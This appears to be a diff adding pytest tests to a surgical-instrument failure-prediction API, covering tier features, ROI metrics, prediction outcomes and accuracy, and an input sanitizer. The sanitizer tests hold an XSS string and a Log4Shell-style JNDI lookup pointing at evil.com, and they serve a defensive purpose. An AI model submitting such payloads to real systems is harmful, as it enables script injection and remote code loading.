@@ -501,3 +501,122 @@ class TestExplainability:
         result = assess_tray_risk(TENANT, "tray-beta")
         factors = [ev.factor for ev in result.evidence]
         assert "instrument_count" in factors
+
+
+class TestTierGating:
+    def test_failures_list_accessible_standard_tier(self):
+        # standard tier can access basic failure list (permissive default when no plan record)
+        r = client.get("/api/predictions/failures", params={"tenant_id": TENANT}, headers=AUTH)
+        assert r.status_code in (200, 402)
+
+    def test_tier_features_include_prediction_keys(self):
+        from app.tier_guard import TIER_FEATURES
+        assert "failure_prediction_basic" in TIER_FEATURES["standard"]
+        assert "failure_prediction_full" in TIER_FEATURES["professional"]
+        assert "predictive_dashboard" in TIER_FEATURES["enterprise"]
+        assert "tray_risk" in TIER_FEATURES["enterprise"]
+
+    def test_professional_tier_has_contamination(self):
+        from app.tier_guard import TIER_FEATURES
+        assert "contamination_prediction" in TIER_FEATURES["professional"]
+
+    def test_enterprise_has_all_prediction_features(self):
+        from app.tier_guard import TIER_FEATURES
+        required = {"failure_prediction_basic", "failure_prediction_full",
+                    "contamination_prediction", "repair_forecasting",
+                    "recall_risk", "tray_risk", "predictive_dashboard"}
+        assert required.issubset(TIER_FEATURES["enterprise"])
+
+
+class TestROIMetric:
+    def test_dashboard_has_roi_field(self):
+        r = client.get("/api/predictions/dashboard", params={"tenant_id": TENANT}, headers=AUTH)
+        assert r.status_code == 200
+        assert "repair_avoidance_roi_usd" in r.json()["dashboard"]
+
+    def test_roi_is_non_negative(self):
+        r = client.get("/api/predictions/dashboard", params={"tenant_id": TENANT}, headers=AUTH)
+        assert r.json()["dashboard"]["repair_avoidance_roi_usd"] >= 0
+
+    def test_roi_is_float(self):
+        r = client.get("/api/predictions/dashboard", params={"tenant_id": TENANT}, headers=AUTH)
+        assert isinstance(r.json()["dashboard"]["repair_avoidance_roi_usd"], float)
+
+
+class TestPredictionOutcomes:
+    def test_record_outcome_returns_id(self):
+        r = client.post("/api/predictions/outcomes", json={
+            "tenant_id": TENANT,
+            "instrument_name": INSTRUMENT,
+            "prediction_date": "2026-06-01T00:00:00+00:00",
+            "predicted_risk_category": "high",
+            "predicted_failure_probability": 0.72,
+            "actual_outcome": "repaired",
+            "recorded_by": "spd_director",
+        }, headers=AUTH)
+        assert r.status_code == 200
+        assert "id" in r.json()
+
+    def test_record_outcome_requires_auth(self):
+        r = client.post("/api/predictions/outcomes", json={
+            "tenant_id": TENANT,
+            "instrument_name": INSTRUMENT,
+            "prediction_date": "2026-06-01T00:00:00+00:00",
+            "predicted_risk_category": "high",
+            "predicted_failure_probability": 0.72,
+            "actual_outcome": "failed",
+        })
+        assert r.status_code in (401, 403)
+
+    def test_accuracy_endpoint_returns_200(self):
+        r = client.get("/api/predictions/accuracy", params={"tenant_id": TENANT}, headers=AUTH)
+        assert r.status_code == 200
+
+    def test_accuracy_has_required_fields(self):
+        r = client.get("/api/predictions/accuracy", params={"tenant_id": TENANT}, headers=AUTH)
+        acc = r.json()["accuracy"]
+        for field in ["total_outcomes", "precision", "recall", "f1_score", "accuracy_pct"]:
+            assert field in acc
+
+    def test_accuracy_precision_in_range(self):
+        r = client.get("/api/predictions/accuracy", params={"tenant_id": TENANT}, headers=AUTH)
+        acc = r.json()["accuracy"]
+        assert 0 <= acc["precision"] <= 100
+        assert 0 <= acc["recall"] <= 100
+
+    def test_accuracy_after_recording_outcome(self):
+        # Record an outcome then check accuracy improves total_outcomes
+        client.post("/api/predictions/outcomes", json={
+            "tenant_id": "accuracy-test-tenant",
+            "instrument_name": "Test Scope",
+            "prediction_date": "2026-05-01T00:00:00+00:00",
+            "predicted_risk_category": "critical",
+            "predicted_failure_probability": 0.88,
+            "actual_outcome": "failed",
+        }, headers=AUTH)
+        r = client.get("/api/predictions/accuracy", params={"tenant_id": "accuracy-test-tenant"}, headers=AUTH)
+        assert r.json()["accuracy"]["total_outcomes"] >= 1
+
+
+class TestInstrumentIdKey:
+    def test_cv_inference_has_instrument_id_field(self):
+        from app.models.cv_inference import CVInferenceRecord
+        assert hasattr(CVInferenceRecord, "instrument_id")
+
+    def test_failure_prediction_accepts_instrument_id_param(self):
+        r = client.get("/api/predictions/failures/test-scope",
+                       params={"tenant_id": TENANT, "instrument_id": "BC-12345"},
+                       headers=AUTH)
+        assert r.status_code in (200, 422)  # 422 only if param not wired
+
+
+class TestSanitizer:
+    def test_sanitizer_removes_injection_chars(self):
+        from app.services.prediction_engine import _sanitize
+        assert "<script>" not in _sanitize("<script>alert(1)</script>")
+        assert "{" not in _sanitize("${jndi:ldap://evil.com}")
+
+    def test_sanitizer_preserves_normal_text(self):
+        from app.services.prediction_engine import _sanitize
+        text = "Pull from service. Schedule inspection within 24 hours."
+        assert _sanitize(text) == text
